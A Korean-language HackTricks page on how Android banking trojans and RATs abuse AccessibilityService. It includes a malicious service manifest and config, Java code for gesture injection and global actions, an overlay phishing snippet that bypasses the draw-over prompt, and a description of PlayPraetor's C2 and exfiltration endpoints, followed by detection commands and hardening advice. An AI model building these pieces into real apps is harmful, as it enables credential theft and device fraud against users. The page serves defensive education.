# Android Accessibility Service Abuse

{{#include ../../banners/hacktricks-training.md}}

## 개요

`AccessibilityService`는 장애인이 Android 장치와 상호작용할 수 있도록 돕기 위해 만들어졌습니다. 불행히도, 동일한 **강력한 자동화 API**(전역 탐색, 텍스트 입력, 제스처 전송, 오버레이 창 등…)는 악성 소프트웨어에 의해 무기화되어 **루트 권한 없이** 핸드셋의 **완전 원격 제어**를 얻을 수 있습니다.

현대 Android 은행 트로이안 및 원격 액세스 트로이안(RAT)인 **PlayPraetor, SpyNote, BrasDex, SOVA, ToxicPanda** 등은 동일한 레시피를 따릅니다:

1. 피해자를 사회 공학적으로 속여 악성 접근성 서비스를 활성화하게 합니다 (*BIND_ACCESSIBILITY_SERVICE* 권한은 "고위험"으로 간주되며 명시적인 사용자 작업이 필요합니다).
2. 서비스를 활용하여
* 화면에 나타나는 모든 UI 이벤트 및 텍스트를 캡처하고,
* 합성 제스처(`dispatchGesture`) 및 전역 작업(`performGlobalAction`)을 주입하여 운영자가 원하는 작업을 자동화하고,
* **TYPE_ACCESSIBILITY_OVERLAY** 창 유형을 사용하여 합법적인 앱 위에 전체 화면 오버레이를 그리며( `SYSTEM_ALERT_WINDOW` 프롬프트 없음!),
* 피해자를 대신하여 시스템 대화 상자를 클릭하여 추가 런타임 권한을 조용히 부여합니다.
3. 사용자가 완전히 정상적인 화면을 보고 있는 동안 데이터를 유출하거나 **On-Device-Fraud (ODF)**를 실시간으로 수행합니다.

---

## 권한 요청
```xml
<!-- AndroidManifest.xml -->
<service
android:name="com.evil.rat.EvilService"
android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
android:exported="false">

<intent-filter>
<action android:name="android.accessibilityservice.AccessibilityService" />
</intent-filter>

<meta-data android:name="android.accessibilityservice"
android:resource="@xml/evil_accessibility_config"/>
</service>
```
동반 XML은 가짜 대화 상자가 어떻게 보일지를 정의합니다:
```xml
<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
android:description="@string/service_description"
android:accessibilityEventTypes="typeAllMask"
android:accessibilityFeedbackType="feedbackGeneric"
android:notificationTimeout="200"
android:canPerformGestures="true"
android:canRetrieveWindowContent="true"/>
```
---

## 원격 UI 자동화 원시 요소
```java
public class EvilService extends AccessibilityService {
@Override
public void onAccessibilityEvent(AccessibilityEvent event) {
// harvest text or detect foreground app change
}

// Simulate HOME / BACK / RECENTS …
private void navHome()     { performGlobalAction(GLOBAL_ACTION_HOME); }
private void navBack()     { performGlobalAction(GLOBAL_ACTION_BACK); }
private void openRecents() { performGlobalAction(GLOBAL_ACTION_RECENTS); }

// Generic tap / swipe
public void tap(float x, float y) {
Path p = new Path(); p.moveTo(x, y);
GestureDescription.StrokeDescription s = new GestureDescription.StrokeDescription(p, 0, 50);
dispatchGesture(new GestureDescription.Builder().addStroke(s).build(), null, null);
}
}
```
이 두 개의 API만으로 공격자는 다음을 수행할 수 있습니다:
* 화면 잠금을 해제하고, 은행 앱을 열고, UI 트리를 탐색하며, 이체 양식을 제출할 수 있습니다.
* 나타나는 모든 권한 대화 상자를 수락할 수 있습니다.
* Play Store 인텐트를 통해 추가 APK를 설치/업데이트할 수 있습니다.

---

## 남용 패턴

### 1. 오버레이 피싱 (자격 증명 수집)
투명하거나 불투명한 `WebView`가 윈도우 관리자에 추가됩니다:
```java
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
TYPE_ACCESSIBILITY_OVERLAY,                      // ⬅ bypasses SYSTEM_ALERT_WINDOW
FLAG_NOT_FOCUSABLE | FLAG_NOT_TOUCH_MODAL,       // touches still reach the real app
PixelFormat.TRANSLUCENT);
wm.addView(phishingView, lp);
```
피해자는 가짜 양식에 자격 증명을 입력하는 동안 백그라운드 앱은 동일한 제스처를 수신합니다. - 의심스러운 "다른 앱 위에 그리기" 프롬프트는 표시되지 않습니다.

> 자세한 예: Tapjacking 페이지 내의 *Accessibility Overlay Phishing* 섹션.

### 2. 기기 내 사기 자동화
**PlayPraetor**와 같은 악성코드 패밀리는 운영자가 고수준 명령(`init`, `update`, `alert_arr`, `report_list`, …)을 발행할 수 있는 지속적인 WebSocket 채널을 유지합니다. 이 서비스는 이러한 명령을 위의 저수준 제스처로 변환하여, 해당 기기에 연결된 다단계 인증을 쉽게 우회하는 실시간 무단 거래를 달성합니다.

### 3. 화면 스트리밍 및 모니터링
**MediaProjection API**와 RTMP 클라이언트 라이브러리를 결합하여 RAT는 라이브 프레임 버퍼를 `rtmp://<c2>:1935/live/<device_id>`로 방송할 수 있으며, 이는 접근성 엔진이 UI를 구동하는 동안 적에게 완벽한 상황 인식을 제공합니다.

---

## PlayPraetor – 명령 및 제어 워크플로우

1. **HTTP(S) 하트비트** – 하드코딩된 목록을 반복하여 하나의 도메인이 활성 C2와 함께 `POST /app/searchPackageName`에 응답할 때까지.
2. **WebSocket (포트 8282)** – 양방향 JSON 명령:
* `update` – 새로운 conf/APK 푸시
* `alert_arr` – 오버레이 템플릿 구성
* `report_list` – 타겟 패키지 이름 목록 전송
* `heartbeat_web` – 유지
3. **RTMP (포트 1935)** – 라이브 화면/비디오 스트리밍.
4. **REST 유출** –
* `/app/saveDevice` (지문)
* `/app/saveContacts` | `/app/saveSms` | `/app/uploadImageBase64`
* `/app/saveCardPwd` (은행 자격 증명)

**AccessibilityService**는 이러한 클라우드 명령을 물리적 상호작용으로 변환하는 로컬 엔진입니다.

---

## 악성 접근성 서비스 탐지

* `adb shell settings get secure enabled_accessibility_services`
* 설정 → 접근성 → *다운로드된 서비스* – Google Play에서 **아닌** 앱을 찾습니다.
* MDM / EMM 솔루션은 `ACCESSIBILITY_ENFORCEMENT_DEFAULT_DENY` (Android 13+)를 적용하여 사이드로드된 서비스를 차단할 수 있습니다.
* 실행 중인 서비스 분석:
```bash
adb shell dumpsys accessibility | grep "Accessibility Service"
```

---

## 앱 개발자를 위한 강화 권장 사항

* 민감한 뷰에 `android:accessibilityDataSensitive="accessibilityDataPrivateYes"` (API 34+)로 표시합니다.
* `setFilterTouchesWhenObscured(true)`와 `FLAG_SECURE`를 결합하여 탭/오버레이 하이재킹을 방지합니다.
* `WindowManager.getDefaultDisplay().getFlags()` 또는 `ViewRootImpl` API를 폴링하여 오버레이를 감지합니다.
* `Settings.canDrawOverlays()` **또는** 신뢰할 수 없는 접근성 서비스가 활성화된 경우 작동을 거부합니다.

---

## 참고 문헌
* [PlayPraetor의 진화하는 위협: 중국어를 사용하는 행위자들이 전 세계적으로 Android RAT를 확장하는 방법](https://www.cleafy.com/cleafy-labs/playpraetors-evolving-threat-how-chinese-speaking-actors-globally-scale-an-android-rat)
* [Android 접근성 문서 – UI 상호작용 자동화](https://developer.android.com/guide/topics/ui/accessibility/service)

{{#include ../../banners/hacktricks-training.md}}
